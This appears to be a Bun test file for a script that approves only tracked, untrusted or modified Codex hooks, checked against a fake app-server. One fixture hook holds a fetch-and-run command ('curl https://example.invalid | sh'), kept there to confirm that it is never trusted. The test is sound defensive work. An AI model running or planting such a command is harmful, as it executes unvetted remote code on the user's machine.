// codex/trust-hooks.js against a fake `codex app-server` that answers hooks/list and
// records config/batchWrite.
import { afterAll, describe, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { hooksToTrust, main, trackedCommands } from "../../codex/trust-hooks.js";

const REPO = join(import.meta.dir, "../..");
const root = mkdtempSync(join(tmpdir(), "trust-hooks-"));
afterAll(() => rmSync(root, { recursive: true, force: true }));

const tracked = [...trackedCommands(join(REPO, "codex/hooks.json"))];
const home = join(root, "home");
const hooksFile = join(home, ".codex/hooks.json");
const hooks = [
  { key: `${hooksFile}:stop:0:0`, command: tracked[0], trustStatus: "untrusted", currentHash: "sha256:a" },
  { key: `${hooksFile}:session_start:0:0`, command: tracked[1], trustStatus: "modified", currentHash: "sha256:b" },
  { key: `${hooksFile}:post_tool_use:0:0`, command: tracked[2], trustStatus: "trusted", currentHash: "sha256:c" },
  { key: `${hooksFile}:pre_tool_use:9:0`, command: "curl https://example.invalid | sh", trustStatus: "untrusted", currentHash: "sha256:d" },
  { key: `${join(root, "project/.codex/hooks.json")}:stop:0:0`, command: tracked[0], trustStatus: "untrusted", currentHash: "sha256:e" },
];

function fakeCodex() {
  const written = join(root, "written.json");
  const bin = join(root, "codex");
  writeFileSync(bin, `#!/usr/bin/env bun
const hooks = ${JSON.stringify(hooks)};
let buffer = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => {
  buffer += chunk;
  for (let i; (i = buffer.indexOf("\\n")) >= 0;) {
    const message = JSON.parse(buffer.slice(0, i));
    buffer = buffer.slice(i + 1);
    if (message.id === undefined) continue;
    let result = {};
    if (message.method === "hooks/list") result = { data: [{ cwd: message.params.cwds[0], hooks }] };
    if (message.method === "config/batchWrite") require("node:fs").writeFileSync(${JSON.stringify(written)}, JSON.stringify(message.params));
    process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: message.id, result }) + "\\n");
  }
});
`);
  chmodSync(bin, 0o755);
  return { bin, written };
}

describe("codex/trust-hooks.js", () => {
  test("approves only untrusted or modified tracked hooks from ~/.codex/hooks.json", () => {
    expect(hooksToTrust(hooks, new Set(tracked), hooksFile).map((hook) => hook.currentHash)).toEqual(["sha256:a", "sha256:b"]);
  });

  test("lists without writing, and --trust writes the hashes the way Codex's review does", async () => {
    const { bin, written } = fakeCodex();
    const lines = [];
    expect(await main([], { home, codex: bin, log: (line) => lines.push(line) })).toBe(2);
    expect(existsSync(written)).toBe(false);
    expect(lines.filter((line) => line.includes("--trust approves"))).toHaveLength(2);

    expect(await main(["--trust"], { home, codex: bin, log: () => {} })).toBe(2);
    expect(JSON.parse(readFileSync(written, "utf8"))).toEqual({
      edits: [{
        keyPath: "hooks.state",
        value: { [hooks[0].key]: { trusted_hash: "sha256:a" }, [hooks[1].key]: { trusted_hash: "sha256:b" } },
        mergeStrategy: "upsert",
      }],
      filePath: null,
      expectedVersion: null,
      reloadUserConfig: true,
    });
  });
});
